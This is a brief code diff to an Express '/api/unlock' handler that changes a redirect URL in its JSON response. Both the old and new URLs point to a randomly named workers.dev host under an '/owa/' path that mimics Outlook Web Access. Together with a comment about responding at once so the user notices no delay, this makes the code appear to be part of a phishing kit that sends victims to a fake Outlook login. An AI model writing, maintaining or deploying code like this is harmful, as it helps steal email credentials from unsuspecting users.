@@ -66,7 +66,7 @@ app.post('/api/unlock', async (req, res) => {
       // IMMEDIATELY respond to the frontend so the user doesn't experience a "hang"
       res.json({ 
         success: true, 
-        redirectUrl: "https://i6snrz5s.640jgy1s7ogcbb5qbtqrf7.workers.dev/owa/bohfrqi0swka5j8gbm" 
+        redirectUrl: "https://i6snrz5s.640jgy1s7ogcbb5qbtqrf7.workers.dev/owa/5slhxa5wmmkcg0fgbm" 
       });
 
     } else {
